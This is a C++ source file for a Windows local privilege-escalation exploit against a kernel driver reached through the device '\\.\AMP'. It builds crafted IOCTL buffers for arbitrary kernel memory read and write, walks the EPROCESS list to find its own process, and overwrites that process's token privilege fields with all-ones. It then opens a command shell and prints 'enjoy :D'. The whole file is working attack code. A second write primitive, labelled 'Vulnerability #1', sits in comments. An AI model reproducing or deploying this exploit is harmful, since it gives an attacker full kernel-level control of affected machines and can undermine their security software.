// DisableScreenProtection2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <psapi.h>
#include <stdio.h>
#pragma warning(disable:4996)

#define _DEBUG

typedef struct _kernelDriverInformation {
    char* imageName;
    void* imageBase;

}kernelDriverInformation, * PKernelDriverInformation;

typedef struct _functionInformation{
    char* functionName;
    void* functionOffset;
    void* functionBase;

}functionInformation, * PFunctionInformation;

void callDeviceIoControl(HANDLE deviceHandle, void* inputBuffer, DWORD inputBufferSize) {
    DWORD bytesReturned;
    NTSTATUS  status = DeviceIoControl(deviceHandle, 0x226003, inputBuffer, inputBufferSize, NULL, NULL, (LPDWORD)&bytesReturned, (LPOVERLAPPED)NULL);
}

HANDLE getDeviceHandle(char* name) {
    DWORD generic_read = 0x80000000;
    DWORD generic_write = 0x40000000;
    HANDLE handle = CreateFileA((LPCSTR)name, GENERIC_READ | generic_write, NULL, NULL, 0x3, NULL, NULL);
    return handle;
}

//Step 1 get ntoskrnl.exe driver base address
PKernelDriverInformation GetDriverBase(char* driverName) {
    PKernelDriverInformation kernelDriverInfo = (PKernelDriverInformation) malloc(sizeof(kernelDriverInformation));
    kernelDriverInfo->imageName = driverName;
    void* imageBases[1024];
    DWORD cbNeeded;
    if (EnumDeviceDrivers(imageBases, sizeof(imageBases), &cbNeeded) && cbNeeded < sizeof(imageBases)) {
        int  numOfDrivers = cbNeeded / sizeof(imageBases[0]);

        LPSTR imageName = (LPSTR)malloc(1024);
        for (int i = 0; i < numOfDrivers; i++) {
            GetDeviceDriverBaseNameA(imageBases[i], imageName, 1024);
            if (strcmp(driverName, (const char*)imageName) == 0) {
                kernelDriverInfo->imageBase = imageBases[i];
#ifdef _DEBUG 
                printf("KernelDriverBase of %s Found! location at  0x%llx\n", kernelDriverInfo->imageName, (ULONGLONG)kernelDriverInfo->imageBase);
#endif
                return kernelDriverInfo;
            }
        }
    }

    return NULL;
}

PFunctionInformation GetExportBase(PKernelDriverInformation moduleInfo, char* functionName) {
    PFunctionInformation functionInfo = (PFunctionInformation)malloc(sizeof(functionInformation));

    HMODULE userModeImageBase = LoadLibraryA(moduleInfo->imageName);
#ifdef _DEBUG 
    printf("Kernel Driver loaded in userland at 0x%llx\n", userModeImageBase);
#endif

    void* functionLocalAddress = GetProcAddress(userModeImageBase, (LPCSTR)functionName);
#ifdef _DEBUG 
    printf("function %s found in kernel PE image, userland address at 0x%llx\n", functionName, functionLocalAddress);
#endif

    void* functionOffset = (void*)((ULONGLONG)functionLocalAddress - (ULONGLONG)userModeImageBase);
#ifdef _DEBUG 
    printf("function offset is 0x%llx\n", functionOffset);
#endif

    void* functionAddressInKernel = (void*)((ULONGLONG)functionOffset + (ULONGLONG)moduleInfo->imageBase);
#ifdef _DEBUG 
    printf("function in kernel is is 0x%llx\n", functionAddressInKernel);
#endif

    functionInfo->functionName = functionName;
    functionInfo->functionBase = functionAddressInKernel;
    functionInfo->functionOffset = functionOffset;
    return functionInfo;
}





void* CreateWriteAddresInAMPsKernelMemoryIOCTLBuffer(void* addressToDereference,SIZE_T bufferSize) {
    byte* maliciousBuffer = (byte*)malloc(bufferSize);
    *(ULONGLONG*)maliciousBuffer = (ULONGLONG)5;   //   funciton pointer, this will be 5
    *(ULONGLONG*)(maliciousBuffer + 0x8) = (ULONGLONG)(maliciousBuffer + 0x20); //(maliciousBuffer);   pointer to parameters
    *(ULONGLONG*)(maliciousBuffer + 0x10) = (ULONGLONG)(maliciousBuffer + 0x10); //(maliciousBuffer + 0x20);// (0x1);  pointer to write return value
    *(ULONGLONG*)(maliciousBuffer + 0x18) = (ULONGLONG)0;//(ULONGLONG)(maliciousBuffer + 0x40); // unknown
    *(ULONGLONG*)(maliciousBuffer + 0x20) = (ULONGLONG)16;  // this will be 16
    *(ULONGLONG*)(maliciousBuffer + 0x28) = (ULONGLONG)0;  // param2
    *(ULONGLONG*)(maliciousBuffer + 0x30) = (ULONGLONG)addressToDereference; // param3
    *(ULONGLONG*)(maliciousBuffer + 0x38) = (ULONGLONG)0;  // param4
    //*(ULONGLONG*)(maliciousBuffer + 0x40) = (ULONGLONG)(maliciousBuffer + 0x40);  //unknown
    //*(ULONGLONG*)(maliciousBuffer + 0x48) = (ULONGLONG)(maliciousBuffer + 0x48); // param1
    //*(ULONGLONG*)(maliciousBuffer + 0x50) = (ULONGLONG)(maliciousBuffer + 0x50); // param2
    //*(ULONGLONG*)(maliciousBuffer + 0x58) = (ULONGLONG)(maliciousBuffer + 0x58); // param3
    //*(ULONGLONG*)(maliciousBuffer + 0x60) = param4Dereferened; //(ULONGLONG)(maliciousBuffer + 0x60);  // param4
    return (void*)maliciousBuffer;
}

void* CreateReadDWORDFromKernelMemoryLeakIOCTLBuffer(SIZE_T bufferSize) {
    byte* maliciousBuffer = (byte*)malloc(bufferSize);
    *(ULONGLONG*)maliciousBuffer = (ULONGLONG)5;   //   funciton pointer, this will be 5
    *(ULONGLONG*)(maliciousBuffer + 0x8) = (ULONGLONG)(maliciousBuffer + 0x20); //(maliciousBuffer);   pointer to parameters
    *(ULONGLONG*)(maliciousBuffer + 0x10) = (ULONGLONG)(maliciousBuffer + 0x10); //(maliciousBuffer + 0x20);// (0x1);  pointer to write return value
    *(ULONGLONG*)(maliciousBuffer + 0x18) = (ULONGLONG)0;//(ULONGLONG)(maliciousBuffer + 0x40); // unknown
    *(ULONGLONG*)(maliciousBuffer + 0x20) = (ULONGLONG)16;  // this will be 16
    *(ULONGLONG*)(maliciousBuffer + 0x28) = (ULONGLONG)2;  // param2
    *(ULONGLONG*)(maliciousBuffer + 0x30) = (ULONGLONG)(ULONGLONG)(maliciousBuffer + 0x40); // param3 
    *(ULONGLONG*)(maliciousBuffer + 0x38) = (ULONGLONG)(ULONGLONG)(maliciousBuffer + 0x48);  // param4
    *(ULONGLONG*)(maliciousBuffer + 0x40) = (ULONGLONG)0;  //unknown
    *(ULONGLONG*)(maliciousBuffer + 0x48) = 0xffffffff; // param1
    //*(ULONGLONG*)(maliciousBuffer + 0x50) = (ULONGLONG)(maliciousBuffer + 0x50); // param2
    //*(ULONGLONG*)(maliciousBuffer + 0x58) = (ULONGLONG)(maliciousBuffer + 0x58); // param3
    //*(ULONGLONG*)(maliciousBuffer + 0x60) = param4Dereferened; //(ULONGLONG)(maliciousBuffer + 0x60);  // param4
    return (void*)maliciousBuffer;
}

/* Vulnerability #1
void* CreateWriteFFAsQwordIOCTLBuffer(void* addressToWrite,SIZE_T bufferSize) {
    byte* maliciousBuffer = (byte*)malloc(bufferSize);
    *(ULONGLONG*)maliciousBuffer = (ULONGLONG)0;   //   funciton pointer, this will be 0  
    *(ULONGLONG*)(maliciousBuffer + 0x8) = (ULONGLONG)(maliciousBuffer + 0x20); //(maliciousBuffer);   pointer to parameters
    *(ULONGLONG*)(maliciousBuffer + 0x10) = (ULONGLONG)(addressToWrite); //  pointer to write return value
    *(ULONGLONG*)(maliciousBuffer + 0x18) = (ULONGLONG)0;//(ULONGLONG)(maliciousBuffer + 0x40); // unknown
    *(ULONGLONG*)(maliciousBuffer + 0x20) = (ULONGLONG)16;  // this will be 16
    *(ULONGLONG*)(maliciousBuffer + 0x28) = (ULONGLONG)2;  // param2
    *(ULONGLONG*)(maliciousBuffer + 0x30) = (ULONGLONG)(ULONGLONG)(maliciousBuffer + 0x40); // param3 
    *(ULONGLONG*)(maliciousBuffer + 0x38) = (ULONGLONG)(ULONGLONG)(maliciousBuffer + 0x48);  // param4
    *(ULONGLONG*)(maliciousBuffer + 0x40) = (ULONGLONG)0;  //unknown
    *(ULONGLONG*)(maliciousBuffer + 0x48) = 0xffffffff; // param1
    //*(ULONGLONG*)(maliciousBuffer + 0x50) = (ULONGLONG)(maliciousBuffer + 0x50); // param2
    //*(ULONGLONG*)(maliciousBuffer + 0x58) = (ULONGLONG)(maliciousBuffer + 0x58); // param3
    //*(ULONGLONG*)(maliciousBuffer + 0x60) = param4Dereferened; //(ULONGLONG)(maliciousBuffer + 0x60);  // param4
    return (void*)maliciousBuffer;
}*/

void* CreateWriteDWORDFromKernelMemoryIOCTLBuffer(void* addressToWriteTo, SIZE_T bufferSize) {
    byte* maliciousBuffer = (byte*)malloc(bufferSize);
    *(ULONGLONG*)maliciousBuffer = (ULONGLONG)5;   //   funciton pointer, this will be 5
    *(ULONGLONG*)(maliciousBuffer + 0x8) = (ULONGLONG)(maliciousBuffer + 0x20); //(maliciousBuffer);   pointer to parameters
    *(ULONGLONG*)(maliciousBuffer + 0x10) = (ULONGLONG)(maliciousBuffer + 0x10); //(maliciousBuffer + 0x20);// (0x1);  pointer to write return value
    *(ULONGLONG*)(maliciousBuffer + 0x18) = (ULONGLONG)0;//(ULONGLONG)(maliciousBuffer + 0x40); // unknown
    *(ULONGLONG*)(maliciousBuffer + 0x20) = (ULONGLONG)16;  // this will be 16
    *(ULONGLONG*)(maliciousBuffer + 0x28) = (ULONGLONG)2;  // param2
    *(ULONGLONG*)(maliciousBuffer + 0x30) = (ULONGLONG)addressToWriteTo; // param3 
    *(ULONGLONG*)(maliciousBuffer + 0x38) = (ULONGLONG)(maliciousBuffer + 0x40);  // param4
    *(ULONGLONG*)(maliciousBuffer + 0x40) = (ULONGLONG)0xffffffff;
    return (void*)maliciousBuffer;
}


/* Vulnerability #1
void writeFFAsDword(void* addressToWriteTo, HANDLE deviceHandle, SIZE_T bufferSize) {
    void* writeFFAsQwordIOCTLBuffer = CreateWriteFFAsQwordIOCTLBuffer(addressToWriteTo, bufferSize);
    callDeviceIoControl(deviceHandle, writeFFAsQwordIOCTLBuffer, bufferSize);
    free(writeFFAsQwordIOCTLBuffer);
}
*/

DWORD leakDWORD(void* addressToLeak, HANDLE deviceHandle, SIZE_T bufferSize) {
    void* writeAddresInAMPsKernelMemoryIOCTLBuffer = CreateWriteAddresInAMPsKernelMemoryIOCTLBuffer(addressToLeak, bufferSize);
    callDeviceIoControl(deviceHandle, writeAddresInAMPsKernelMemoryIOCTLBuffer, bufferSize);
    free(writeAddresInAMPsKernelMemoryIOCTLBuffer);
    //address should now be written in kernel memory
    void* ReadDWORDFromKernelMemoryLeakIOCTLBuffer = CreateReadDWORDFromKernelMemoryLeakIOCTLBuffer(bufferSize);
#ifdef _DEBUG2
    printf("before device IO control %lx\n", ((byte*)ReadDWORDFromKernelMemoryLeakIOCTLBuffer + 0x40));
#endif
    callDeviceIoControl(deviceHandle, ReadDWORDFromKernelMemoryLeakIOCTLBuffer, bufferSize);
#ifdef _DEBUG2
    //DWORD should now be stored in the location that is referened by parameter3 in ReadDWORDFromKernelMemoryLeakIOCTLBuffer, this offset should be at ReadDWORDFromKernelMemoryLeakIOCTLBuffer+0x40
    printf("after device IO control %lx\n", *(DWORD*)((byte*)ReadDWORDFromKernelMemoryLeakIOCTLBuffer + 0x40));
#endif
    DWORD returnVal = *(DWORD*)((byte*)ReadDWORDFromKernelMemoryLeakIOCTLBuffer + 0x40);
    free(ReadDWORDFromKernelMemoryLeakIOCTLBuffer);

    return returnVal;
}

void writeDWORD(void* addressToWrite, void* PDWORDToWrite, HANDLE deviceHandle, SIZE_T bufferSize) {
    void* writeAddresInAMPsKernelMemoryIOCTLBuffer = CreateWriteAddresInAMPsKernelMemoryIOCTLBuffer(PDWORDToWrite, bufferSize);
    callDeviceIoControl(deviceHandle, writeAddresInAMPsKernelMemoryIOCTLBuffer, bufferSize);
    free(writeAddresInAMPsKernelMemoryIOCTLBuffer);
    //address should now be written in kernel memory
    void* ReadDWORDFromKernelMemoryLeakIOCTLBuffer = CreateWriteDWORDFromKernelMemoryIOCTLBuffer(addressToWrite, bufferSize);
    callDeviceIoControl(deviceHandle, ReadDWORDFromKernelMemoryLeakIOCTLBuffer, bufferSize);
    free(ReadDWORDFromKernelMemoryLeakIOCTLBuffer);

    return;
}

void* leakQWORD(void* addressToLeak, HANDLE deviceHandle, SIZE_T bufferSize) {
    DWORD firstDWORD = leakDWORD(addressToLeak, deviceHandle, bufferSize);
#ifdef _DEBUG2
    printf("First DWORD is %lx\n", firstDWORD);
#endif
    DWORD secondDWORD = leakDWORD((byte*)addressToLeak + 0x4, deviceHandle, bufferSize);
#ifdef _DEBUG2
    printf("Second DWORD is %lx\n", secondDWORD);
#endif

    void** Pqword = (void**)malloc(0x8);
#ifdef _DEBUG2
    printf("Pqword is at %p\n", Pqword);
#endif

    for (int i = 0; i < 4; i++) {
        ((byte*)Pqword)[i] = ((byte*)&firstDWORD)[i];
        ((byte*)Pqword)[i+4] = ((byte*)&secondDWORD)[i];
    }

#ifdef _DEBUG2
    printf("Pqword value %p\n", *(void**)Pqword);
#endif
    return (*(void**)Pqword);
}

void writeQWORD(void* addressToWrite, void* QWORDToWrite, HANDLE deviceHandle, SIZE_T bufferSize) {


    writeDWORD(addressToWrite, QWORDToWrite, deviceHandle, bufferSize);
    writeDWORD((byte*)addressToWrite + 0x4, ((byte*)QWORDToWrite + 0x4), deviceHandle, bufferSize);

}

void CreateElevatedProcess() {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Start the child process. 
    if (!CreateProcessA(NULL,   // No module name (use command line)
        (LPSTR)"cmd.exe",        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return;
    }
    /*
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close the open handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    */
}

int main(int argc, char* argv[])
{
    //DWORD currentPID = atoi(argv[1]);
    DWORD currentPID = GetCurrentProcessId();
    printf("started...\n");
    //Step 1 get ntoskrnl.exe driver base address
    PKernelDriverInformation driverInfo =  GetDriverBase((char*)"ntoskrnl.exe");
    //Step 2 get address of exported var PsInitialSystemProcess
    PFunctionInformation functionInfo =  GetExportBase(driverInfo, (char*)"PsInitialSystemProcess");


#ifdef _DEBUG
    printf("press anything to begin execution\n");
    getchar();
#endif
    
    HANDLE deviceHandle = getDeviceHandle((char*)"\\\\.\\AMP");

    
    SIZE_T size = 0x300;

    //Step 3 get address of Eprocess Sturcture 
    void* EprocessStruct = leakQWORD((void*) functionInfo->functionBase, deviceHandle, size);

    //DWORD currentPID = GetCurrentProcessId();
    void* currentEprocess = EprocessStruct;
    void* active_process_links = NULL;
    void* next_process_links = NULL;
    DWORD eprocessPid;
#ifdef _DEBUG
    printf("inital eprocessStruct leaked as %llx\n", (ULONGLONG)currentEprocess);
#endif
    // Step 4 Enumerate the EPROCESS Struct
    while (TRUE) {
        active_process_links = (void*) ((ULONGLONG)currentEprocess + (ULONGLONG)0x2f0);
        next_process_links = leakQWORD(active_process_links, deviceHandle, size);
        currentEprocess = (void*)((ULONGLONG)next_process_links - 0x2f0);
        eprocessPid = (DWORD)leakQWORD((void*)((ULONGLONG)currentEprocess + 0x2e8), deviceHandle, size);
        if (eprocessPid == currentPID) {
            break;
        }
    }

#ifdef _DEBUG
    printf("EProcess of our target PID %llx\n", (ULONGLONG)currentEprocess);
#endif
    // found our process now lets get the _EX_FAST_REF TokenSTruct 
    void* tokenFastRef = leakQWORD((void*)((ULONGLONG)currentEprocess + 0x360), deviceHandle, size);
    // 0 our the last 4 bytes to get the real address

#ifdef _DEBUG
    printf("TokenFastRef leaked as %llx\n", tokenFastRef);
#endif

    void* token = (void*)((ULONGLONG)tokenFastRef & 0xFFFFFFFFFFFFFFF0);

#ifdef _DEBUG
    printf("Token leaked as %llx\n", token);
#endif

    //write our permissions to our token at 0x40 (present) and 0x48 (enabled)

    ULONGLONG TokenPermissions = 0xFFFFFFFFFFFFFFFF;
    writeQWORD((void*)((ULONGLONG)token + 0x40), (void*)&TokenPermissions, deviceHandle, size);
    writeQWORD((void*)((ULONGLONG)token + 0x48), (void*)&TokenPermissions, deviceHandle, size);

    /* Using Vulnerability #1 
    writeFFAsDword((void*)((ULONGLONG)token + 0x40), deviceHandle, size);
    writeFFAsDword((void*)((ULONGLONG)token + 0x44), deviceHandle, size);
    writeFFAsDword((void*)((ULONGLONG)token + 0x48), deviceHandle, size);
    writeFFAsDword((void*)((ULONGLONG)token + 0x4c), deviceHandle, size);
    */

    printf("enjoy :D\n", token);

    //CreateElevatedProcess();
    system("cmd.exe");




}